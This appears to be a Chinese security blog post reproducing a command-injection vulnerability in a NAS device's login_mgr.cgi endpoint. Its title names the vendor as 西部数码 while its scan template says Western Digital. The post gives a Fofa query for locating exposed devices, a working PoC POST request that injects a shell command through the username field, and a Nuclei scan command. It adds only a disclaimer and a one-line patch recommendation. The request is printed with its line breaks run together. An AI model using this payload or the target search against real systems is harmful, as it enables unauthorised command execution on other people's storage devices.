#  漏洞复现｜西部数码 NAS login_mgr.cgi 存在命令执行漏洞  
 Poc复现   2026-10-14 09:52  
  
   
  
# 免责声明  
> 「此公众号所分享的网络安全知识、信息及工具皆来源互联网公开收集整理，仅供学习和研究使用，请勿用于非法测试活动。由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，产生的一切后果由读者自行承担，皆与本公众号及文章作者无关、不负任何责任！！！」「如有内容侵权，请联系我们删除处理。谢谢合作！！！」  
  
# 漏洞概述  
> 西部数码 NAS login_mgr.cgi 存在命令执行漏洞，攻击者可获取系统权限。  
  
# 影响范围  
> 西部数码 NAS  
  
# 空间测绘  
### Fofa  
```
body="_PROJECT_MODEL_ID_YOSEMITE " &&body="_PROJECT_MODEL_ID_LIGHTNING "
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Qvo4lzibsScz9r01HvWHyWFqvJD6W4ZSRspK3bcqXvbc3vicFvSdA53UHtNPCxNEnutp4oib6CyKibicPdibMXrsQCphBjJgTTG56BJKtuw5QDhdY/640?wx_fmt=png&from=appmsg "")  
# 漏洞复现  
#### Poc  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Qvo4lzibsScxYpia1L6LT00BnViaYMDLaq7LyStc6OU38pThzzxYia3Pm7ficONDl1d5kkZn0wWvHM7cARA65ttTSg6DdiciaXcN9UBKde3uth8x7c/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Qvo4lzibsScyz6ibS6xJ8YLGXJNpQ4l5UTkB6LRV1D7ZTD4KicImictcKaE8ZLnSEprEMF3zLOnuvELhPyxFmCWHZAgc24r3gYUa82JVIjvJYc4/640?wx_fmt=png&from=appmsg "")  
```
POST /cgi-bin/login_mgr.cgi HTTP/1.1Host:127.0.0.1Content-Type: application/x-www-form-urlencodedcmd=wd_login&username=\admin'$(id>/var/www/xxx.png)'&pwd=123456
```  
# 漏洞自查  
#### Nuclei  
```
nuclei.exe -u 目标URL -stats -silent -t westerndigital-nas-login-mgr-cgi-rce.yaml  
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Qvo4lzibsScxWQGicBianHUhjqJ16iaeDSV3ISzIbtKzbkyWQa1qJqnpSql0ge87ibR7HDyncJdytFDgibtgUmtq6n4PibtMHAXU1qbX05mjSEicDkA/640?wx_fmt=png&from=appmsg "")  
# 修复建议  
> • 建议联系厂商打补丁或升级版本。• 增加Web应用防火墙防护。  
  
### poc免费获取  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Qvo4lzibsScxlkzpicyD2Q00Saukef5vUHqxWCZAicVr1nNE9lOsqkZzbiaaFalicL6RmiaNYBA75iax842thxEF5AiclKKOLnDsU1kI6oaSEYC3Biag/640?wx_fmt=jpeg&from=appmsg "")  
  
  
   
  
  
